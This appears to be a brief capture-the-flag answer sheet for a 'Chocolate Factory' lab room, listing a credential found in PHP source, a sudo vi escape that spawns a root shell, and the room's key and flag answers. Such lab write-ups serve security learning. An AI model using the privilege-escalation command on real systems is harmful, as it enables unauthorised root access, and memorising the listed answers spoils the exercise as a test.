# Chocolate Factory-Remote Code Execution&sudo vi privilige escalation

```
export IP=10.10.61.186
```

# Material needed

1. Interesting directory: /home.php

2. Charlie password

```
if($uname=="charlie" && $password=="cn7824"){
		echo "<script>window.location='home.php'</script>";
```

3. Privilege escalation

```
sudo vi -c ':!/bin/sh' /dev/null
```

# Tasks

1. Enter the key you found! 

```
-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
```

2. What is Charlie's password?

```
cn7824
```

3. Enter the user flag

```
flag{cd5509042371b34e4826e4838b522d2e}
```

4. Enter the root flag

```
flag{cec59161d338fef787fcb4e296b42124}
```